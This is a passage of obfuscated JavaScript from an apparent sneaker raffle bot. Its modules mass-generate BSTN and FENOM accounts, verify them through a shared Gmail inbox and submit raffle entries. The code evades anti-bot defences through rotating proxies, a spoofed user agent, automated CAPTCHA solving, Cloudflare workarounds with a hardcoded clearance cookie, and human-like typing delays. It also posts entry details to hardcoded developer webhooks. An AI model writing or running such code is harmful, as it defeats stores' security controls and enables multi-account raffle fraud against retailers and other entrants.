                            }), console['log'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x43d847['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x43d847['setRequestInterception'](!![]), _0x43d847['on']('request', _0x564573 => {
                                _0x564573['resourceType']() === 'image' ? _0x564573['abort']() : _0x564573['continue']();
                            }), await _0x43d847['goto']('' + _0x3ff0ad), await _0x43d847['waitForSelector']('button[class=\x22cf2Lf6\x22]'), await _0x43d847['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x38c39e(0x7d0), console['log'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x38c39e(0x190), await _0x43d847['waitForSelector']('#firstname'), await _0x43d847['type']('#firstname', _0x2ed855[_0x111f4a]['FirstName'], { 'delay': 0xf0 }), await _0x38c39e(0x190), await _0x43d847['type']('#lastname', _0x2ed855[_0x111f4a]['LastName'], { 'delay': 0xe6 }), await _0x38c39e(0x190), await _0x43d847['type']('#email_address', _0x2ed855[_0x111f4a]['Email'], { 'delay': 0x122 }), await _0x38c39e(0x190), await _0x43d847['type']('#password', _0x2ed855[_0x111f4a]['Password'], { 'delay': 0x82 }), await _0x38c39e(0x1f4), await _0x43d847['type']('#password-confirmation', _0x2ed855[_0x111f4a]['Password'], { 'delay': 0x7c }), console['log'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20Sending\x20Request'), await _0x38c39e(0x2bc), await _0x43d847['$eval']('#form-validate', _0x566f27 => _0x566f27['submit']()), await _0x38c39e(0x1388);
                            const _0x1043a9 = await _0x43d847['$']('#email_address-error');
                            if (_0x1043a9)
                                throw new Error('Invalid\x20Email');
                            const _0x260a20 = await _0x43d847['$']('#password-error');
                            if (_0x260a20)
                                throw new Error('Invalid\x20Password');
                            await _0x43d847['waitForSelector']('div.mesg-success'), _0x3b87d5 = 'no', console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20Account\x20' + _0x2ed855[_0x111f4a]['Email'] + '\x20Generated')), _0x4d1c4a['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x2ed855[_0x111f4a]['Email'] + ',' + _0x2ed855[_0x111f4a]['Password']);
                            try {
                                _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x3112f7['succesDEVMSG']);
                            } catch {
                            }
                            await _0x16a920(_0x244950, _0x3112f7['succesDEVMSG']), console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x5dce43) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20' + _0x5dce43)), _0x27cfe0 = '' + _0x5dce43;
                            var _0x2aad77 = await _0x485032(_0x2ed855[_0x111f4a], _0x427332, 'acc', !![], _0x27cfe0);
                            _0x3112f7['errorDEV'] = { 'embeds': [_0x2aad77] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x3112f7['errorDEV']), await _0x16a920(_0x233d0f, _0x3112f7['errorDEV']), _0x3b87d5 = 'yes';
                        } finally {
                            _0x9b8c33['close']();
                            if (_0x3b87d5 == 'yes' && _0x466a72 != 0x5) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Task\x20' + (_0x111f4a + 0x1) + '\x20:\x20Retrying')), _0x111f4a = _0x111f4a - 0x1, _0x466a72 = _0x466a72 + 0x1;
                                continue;
                            }
                            _0x3b87d5 == 'yes' && _0x466a72 >= 0x5 && (_0x1ac5d5(_0x2ed855[_0x111f4a], _0x427332), _0x3b87d5 = 'no', _0x466a72 = 0x0), console['log'](_0x21c871() + '\x20[' + _0x427332['name'] + ']\x20Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x145ded, _0x4a423e, _0x1f715f) {
                    var _0x4a423e = [];
                    async function _0x22e074() {
                        var _0x52a61f = new _0xdc01cc({
                            'user': _0x5e160d['masterMail'],
                            'password': _0x5e160d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x476bd5(_0x29c6b1) {
                            _0x52a61f['openBox']('INBOX', ![], _0x29c6b1);
                        }
                        _0x52a61f['once']('ready', function () {
                            _0x476bd5(function (_0x33b807, _0x1b523d) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x33b807)
                                    throw _0x33b807;
                                _0x52a61f['seq']['search'](['UNSEEN'], function (_0x5e9ed8, _0x1bfa3e) {
                                    if (!_0x1bfa3e || !_0x1bfa3e['length'])
                                        console['log'](_0x21c871() + '\x20[' + _0x145ded['name'] + ']\x20No\x20mails\x20found'), _0x52a61f['end']();
                                    else {
                                        var _0x2bda1c = _0x52a61f['seq']['fetch'](_0x1bfa3e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x2bda1c['on']('message', function (_0xc9edb, _0x4571c0) {
                                            var _0x3d6210 = '(#' + _0x4571c0 + ')\x20';
                                            _0xc9edb['on']('body', function (_0x579ac9, _0x57cfe6) {
                                                _0x31366c(_0x579ac9, (_0x415a20, _0x5705be) => {
                                                    if (_0x5705be['subject'] == 'Please\x20confirm\x20your\x20BSTN\x20Store\x20account') {
                                                        var _0x4960d8 = _0x5705be['text']['split']('[')[0x2], _0x4e6792 = _0x4960d8['split'](']')[0x0], _0x28a5e5 = _0x5705be['html']['split']('\x0a');
                                                        _0x4a423e['push'](_0x4e6792);
                                                    }
                                                });
                                            }), _0xc9edb['once']('end', function () {
                                            });
                                        }), _0x2bda1c['once']('error', function (_0x5696ab) {
                                            console['log']('Fetch\x20error:\x20' + _0x5696ab);
                                        }), _0x2bda1c['once']('end', function () {
                                            _0x52a61f['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x52a61f['once']('error', function (_0x45e080) {
                            console['log'](_0x52c84d['red'](_0x45e080['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x52a61f['once']('end', async function () {
                        }), _0x52a61f['connect']();
                    }
                    async function _0x1a9849(_0x2e32bb, _0x5025fa, _0x10b2b7) {
                        _0x3d68d8['use'](_0x4dfb83());
                        for (var _0x1b24b2 = 0x0; _0x1b24b2 < _0x5025fa['length']; _0x1b24b2++) {
                            if (_0xc876de != 'yes')
                                var _0xc876de = '', _0x40f04 = 0x0;
                            var _0x2a14fa = Math['round'](Math['random']() * (_0x10b2b7['length'] - 0x1)), _0x2701f6 = _0x10b2b7[_0x2a14fa]['split'](':');
                            const _0x3a261a = await _0x3d68d8['launch']({
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2701f6[0x0] + ':' + _0x2701f6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                            try {
                                const _0x42500f = await _0x3a261a['newPage']();
                                await _0x42500f['authenticate']({
                                    'username': '' + _0x2701f6[0x2],
                                    'password': '' + _0x2701f6[0x3]
                                }), console['log'](_0x21c871() + '\x20[' + _0x2e32bb['name'] + ']\x20Task\x20' + (_0x1b24b2 + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x42500f['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x42500f['setRequestInterception'](!![]), _0x42500f['on']('request', _0x261f72 => {
                                    _0x261f72['resourceType']() === 'image' || _0x261f72['resourceType']() === 'font' || _0x261f72['resourceType']() === 'media' ? _0x261f72['abort']() : _0x261f72['continue']();
                                }), console['log'](_0x21c871() + '\x20[' + _0x2e32bb['name'] + ']\x20Task\x20' + (_0x1b24b2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x42500f['goto'](_0x5025fa[_0x1b24b2]), console['log'](_0x21c871() + '\x20[' + _0x2e32bb['name'] + ']\x20Task\x20' + (_0x1b24b2 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x42500f['waitForTimeout'](0xbb8);
                                try {
                                    await _0x42500f['waitForSelector']('.account-nav'), _0xc876de = 'no', console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x2e32bb['name'] + ']\x20Task\x20' + (_0x1b24b2 + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x416769 = await _0x485032(null, _0x2e32bb, 'ver', ![]);
                                    const _0x17bde6 = { 'succesDEVMSG': { 'embeds': [_0x416769] } };
                                    await _0x16a920(_0x296457, _0x17bde6['succesDEVMSG']);
                                } catch (_0x512375) {
                                    throw new Error(_0x512375);
                                }
                            } catch (_0x1370d1) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x2e32bb['name'] + ']\x20Task\x20' + (_0x1b24b2 + 0x1) + '\x20:\x20' + _0x1370d1));
                                var _0x26137e = _0x1370d1, _0xf79b1 = await _0x485032(null, _0x2e32bb, 'ver', !![], _0x26137e);
                                const _0x4aae67 = { 'errorDEVMSG': { 'embeds': [_0xf79b1] } };
                                _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x4aae67['errorDEVMSG']), await _0x16a920(_0x233d0f, _0x4aae67['errorDEVMSG']), _0xc876de = 'yes';
                            } finally {
                                _0x3a261a['close']();
                                if (_0xc876de == 'yes' && _0x40f04 != 0x5) {
                                    console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x2e32bb['name'] + ']\x20Task\x20' + (_0x1b24b2 + 0x1) + '\x20:\x20Retrying')), _0x1b24b2 = _0x1b24b2 - 0x1, _0x40f04 = _0x40f04 + 0x1;
                                    continue;
                                }
                                _0xc876de == 'yes' && _0x40f04 >= 0x5 && (_0xc876de = 'no', _0x40f04 = 0x0), console['log'](_0x21c871() + '\x20[' + _0x2e32bb['name'] + ']\x20Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                            }
                        }
                    }
                    try {
                        _0x22e074(), await _0x38c39e(0xfa0), console['log']('Found\x20' + _0x4a423e['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1a9849(_0x145ded, _0x4a423e, _0x1f715f);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x2bd095, _0x3483d5, _0x23d363) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1882cf = 0x0; _0x1882cf < _0x3483d5['length']; _0x1882cf++) {
                        var _0x543d6f;
                        await _0x3962cc(_0x3483d5, _0x1882cf);
                        if (_0x2741ed != 'yes')
                            var _0x2741ed = '', _0x5def7e = 0x0;
                        _0x2ad028(_0x2bd095['name'] + '\x20Task\x20' + (_0x1882cf + 0x1) + '\x20/\x20' + _0x3483d5['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92);
                        var _0x19550a = Math['round'](Math['random']() * (_0x23d363['length'] - 0x1)), _0x1d144a = _0x23d363[_0x19550a]['split'](':'), _0x24851f;
                        try {
                            _0x24851f = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1d144a[0x0] + ':' + _0x1d144a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x24851f = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1d144a[0x0] + ':' + _0x1d144a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2fabef = await _0x24851f['newPage'](), _0x2ef834 = await _0x2fabef['target']()['createCDPSession'](), { windowId: _0x5c8c12 } = await _0x2ef834['send']('Browser.getWindowForTarget');
                            await _0x2fabef['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x1ed9ea = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x2fabef['authenticate']({
                                'username': '' + _0x1d144a[0x2],
                                'password': '' + _0x1d144a[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2fabef['goto']('' + _0x3483d5[_0x1882cf]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2fabef['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L'), await _0x2ef834['send']('Browser.setWindowBounds', {
                                'windowId': _0x5c8c12,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x38c39e(0x1388), await _0x2fabef['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2fabef['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x38c39e(0x1f4), console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Logging\x20in'), await _0x2fabef['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x4608bc => _0x4608bc['click']()), await _0x2fabef['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x2fabef['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x38c39e(0x7d0), await _0x2fabef['waitForSelector']('#email-login'), await _0x2fabef['type']('#email-login', '' + _0x3483d5[_0x1882cf]['Email']), await _0x38c39e(0xdac), await _0x2fabef['waitForSelector']('#password'), await _0x2fabef['type']('#password', '' + _0x3483d5[_0x1882cf]['Password'], { 'delay': 0xe6 }), await _0x38c39e(0x157c);
                            try {
                                await _0x2fabef['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x14af6d => _0x14af6d['click']());
                            } catch {
                            }
                            try {
                                await _0x2fabef['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x53731f) {
                            }
                            await _0x38c39e(0x3e8);
                            const _0x1ccb61 = await _0x2fabef['$']('.enteredDraw_container__2KmQ_');
                            if (_0x1ccb61)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3483d5[_0x1882cf]['Size']);
                            if (_0x3483d5[_0x1882cf]['Size'] != 'RANDOM') {
                                var _0x2fd78f = _0x3483d5[_0x1882cf]['Size']['replace']('.', ',');
                                const _0xd6dcb3 = await _0x2fabef['$x']('//div[contains(text(),\x20' + _0x2fd78f + ')]');
                                await _0xd6dcb3[0x0]['click']();
                            } else {
                                const _0x523775 = await _0x2fabef['$$']('div.swatchTile_tile__IRH9Q');
                                var _0x1f789c = Math['round'](Math['random']() * (_0x523775['length'] - 0x1));
                                await _0x523775[_0x1f789c]['click']();
                            }
                            await _0x38c39e(0x1f4);
                            const _0x8dbb85 = await _0x2fabef['$']('.addressList_addressItem__LE2PB');
                            if (_0x8dbb85 && _0x3483d5[_0x1882cf]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Filling\x20Address'), await _0x2fabef['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x38c39e(0x5dc), await _0x2fabef['waitForSelector']('#firstname'), await _0x2fabef['type']('#firstname', '' + _0x3483d5[_0x1882cf]['FirstName']), await _0x38c39e(0x1f4), await _0x2fabef['waitForSelector']('#firstname'), await _0x2fabef['type']('#lastname', '' + _0x3483d5[_0x1882cf]['LastName']), await _0x38c39e(0x1f4), await _0x2fabef['waitForSelector']('#firstname'), await _0x2fabef['type']('#street', '' + _0x3483d5[_0x1882cf]['Address1']), await _0x38c39e(0x1f4), await _0x2fabef['waitForSelector']('#firstname'), await _0x2fabef['type']('#houseNumber', _0x3483d5[_0x1882cf]['HouseNumber'] + '\x20' + _0x3483d5[_0x1882cf]['Address2']), await _0x38c39e(0x1f4), await _0x2fabef['waitForSelector']('#firstname'), await _0x2fabef['select']('#country_code', '' + _0x3483d5[_0x1882cf]['Country']), await _0x38c39e(0x1f4), await _0x2fabef['type']('#postcode', '' + _0x3483d5[_0x1882cf]['Zip']), await _0x38c39e(0x1f4), await _0x2fabef['type']('#city', '' + _0x3483d5[_0x1882cf]['City']), await _0x38c39e(0x1f4), await _0x2fabef['type']('#telephone', '' + _0x3483d5[_0x1882cf]['Phone']), await _0x38c39e(0x1f4), await _0x2fabef['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x38c39e(0x9c4);
                            try {
                                await _0x2fabef['type']('#instagram_name', '' + _0x3483d5[_0x1882cf]['Follower']), await _0x2fabef['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x38c39e(0x5dc);
                            try {
                                await _0x2fabef['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x38c39e(0x5dc), await _0x2fabef['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5d201b => _0x5d201b['click']()), await _0x38c39e(0x1388);
                            try {
                                await _0x2fabef['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x2fabef['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x3483d5[_0x1882cf]['Size'] != 'RANDOM') {
                                    var _0x2fd78f = _0x3483d5[_0x1882cf]['Size']['replace']('.', ',');
                                    const _0x464013 = await _0x2fabef['$x']('//div[contains(text(),\x20' + _0x2fd78f + ')]');
                                    await _0x464013[0x0]['click']();
                                } else {
                                    const _0x2968b6 = await _0x2fabef['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x1f789c = Math['round'](Math['random']() * (_0x2968b6['length'] - 0x1));
                                    await _0x2968b6[_0x1f789c]['click']();
                                }
                                await _0x38c39e(0x5dc);
                                try {
                                    await _0x2fabef['hover']('#instagram_name'), await _0x2fabef['type']('#instagram_name', '' + _0x3483d5[_0x1882cf]['Follower']), await _0x2fabef['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Retrying'), await _0x2fabef['hover']('.checkBox_boxHolder__wLGVe'), await _0x38c39e(0x5dc), await _0x2fabef['click']('.checkBox_boxHolder__wLGVe'), await _0x38c39e(0x157c), await _0x2fabef['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x4a32ff => _0x4a32ff['click']()), await _0x38c39e(0x1388), await _0x2fabef['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x2741ed = 'no', _0x41f993(_0x3483d5[_0x1882cf], _0x2bd095), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0xb621ba = await _0x485032(_0x3483d5[_0x1882cf], _0x2bd095, 'dev', ![]), _0x19e163 = await _0x485032(_0x3483d5[_0x1882cf], _0x2bd095, 'pub', ![]);
                            const _0x49a8fc = {
                                'succesDEVMSG': { 'embeds': [_0xb621ba] },
                                'succesPUBMSG': { 'embeds': [_0x19e163] }
                            };
                            try {
                                _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x49a8fc['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x49a8fc['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x2766d4, _0x49a8fc['succesPUBMSG']);
                            } catch (_0x2ad86b) {
                                console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2ad86b));
                            }
                        } catch (_0x47fe2c) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20' + _0x47fe2c)), _0x2741ed = 'yes', _0x543d6f = '' + _0x47fe2c;
                            var _0x169723 = await _0x485032(_0x3483d5[_0x1882cf], _0x2bd095, 'dev', !![], _0x543d6f), _0xb621ba = await _0x485032(_0x3483d5[_0x1882cf], _0x2bd095, 'dev', ![]), _0x19e163 = await _0x485032(_0x3483d5[_0x1882cf], _0x2bd095, 'pub', ![]);
                            const _0x2c7fc3 = {
                                'succesDEVMSG': { 'embeds': [_0xb621ba] },
                                'succesPUBMSG': { 'embeds': [_0x19e163] }
                            };
                            _0x2c7fc3['errorDEV'] = { 'embeds': [_0x169723] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x2c7fc3['errorDEV']), await _0x16a920(_0x233d0f, _0x2c7fc3['errorDEV']);
                        } finally {
                            _0x24851f['close']();
                            if (_0x2741ed == 'yes' && _0x5def7e != 0x5) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Task\x20' + (_0x1882cf + 0x1) + '\x20:\x20Retrying')), _0x1882cf = _0x1882cf - 0x1, _0x5def7e = _0x5def7e + 0x1;
                                continue;
                            }
                            _0x2741ed == 'yes' && _0x5def7e >= 0x5 && (_0x1ac5d5(_0x3483d5[_0x1882cf], _0x2bd095), _0x2741ed = 'no', _0x5def7e = 0x0), console['log'](_0x21c871() + '\x20[' + _0x2bd095['name'] + ']\x20Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x13a316, _0x5caa2a, _0x343f51) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1fcb72 = 0x0; _0x1fcb72 < _0x5caa2a['length']; _0x1fcb72++) {
                        if (_0x329036 != 'yes')
                            var _0x329036 = '', _0x54f253 = 0x0;
                        var _0x10f3e1;
                        await _0x3962cc(_0x5caa2a, _0x1fcb72), _0x2ad028(_0x13a316['name'] + '\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20/\x20' + _0x5caa2a['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92);
                        var _0x246338 = await _0x485032(_0x5caa2a[_0x1fcb72], _0x13a316, 'acc', ![]);
                        const _0x15f687 = { 'succesDEVMSG': { 'embeds': [_0x246338] } }, _0x417ffe = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4a9a00 = Math['round'](Math['random']() * (_0x343f51['length'] - 0x1)), _0x143f48 = _0x343f51[_0x4a9a00]['split'](':'), _0x2358ac;
                        try {
                            _0x2358ac = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x143f48[0x0] + ':' + _0x143f48[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2358ac = await _0x3d68d8['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x143f48[0x0] + ':' + _0x143f48[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x19092a = await _0x2358ac['newPage']();
                            await _0x19092a['setViewport']({
                                'width': 0x500 + _0x32d290(0x1, 0x32),
                                'height': 0x2d9 + _0x32d290(0x1, 0x32)
                            });
                            const _0x4ebc5c = await _0x19092a['target']()['createCDPSession'](), { windowId: _0x1863df } = await _0x4ebc5c['send']('Browser.getWindowForTarget');
                            await _0x19092a['authenticate']({
                                'username': '' + _0x143f48[0x2],
                                'password': '' + _0x143f48[0x3]
                            }), console['log'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x19092a['goto']('' + _0x417ffe, { 'waitUntil': 'networkidle2' }), await _0x38c39e(0x1388), console['log'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                const _0x9fd2e0 = await _0x19092a['$eval']('input[value=\x22Verify\x20you\x20are\x20human\x22]');
                                _0x9fd2e0 && await _0x9fd2e0['click']();
                            } catch {
                            }
                            await _0x4ebc5c['send']('Browser.setWindowBounds', {
                                'windowId': _0x1863df,
                                'bounds': { 'windowState': 'minimized' }
                            });
                            try {
                                await _0x19092a['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x38c39e(0xfa0);
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            console['log'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x19092a['type']('input[name=\x22firstname\x22]', '' + _0x5caa2a[_0x1fcb72]['FirstName']), await _0x38c39e(0x1f4), await _0x19092a['type']('input[name=\x22lastname\x22]', '' + _0x5caa2a[_0x1fcb72]['LastName']), await _0x38c39e(0x1f4), await _0x19092a['type']('input[name=\x22email\x22]', '' + _0x5caa2a[_0x1fcb72]['Email']), await _0x38c39e(0x1f4), await _0x19092a['type']('input[name=\x22password\x22]', '' + _0x5caa2a[_0x1fcb72]['Password']), await _0x38c39e(0x258), await _0x19092a['$eval']('input[name=\x22psgdpr\x22]', _0x64cfa2 => _0x64cfa2['click']()), await _0x38c39e(0x1f4), console['log'](_0x21c871() + '\x20[' + _0x13a316['name'] + ']\x20Task\x20' + (_0x1fcb72 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x19092a['$eval']('#customer-form', _0x353047 => _0x353047['submit']());
                            try {
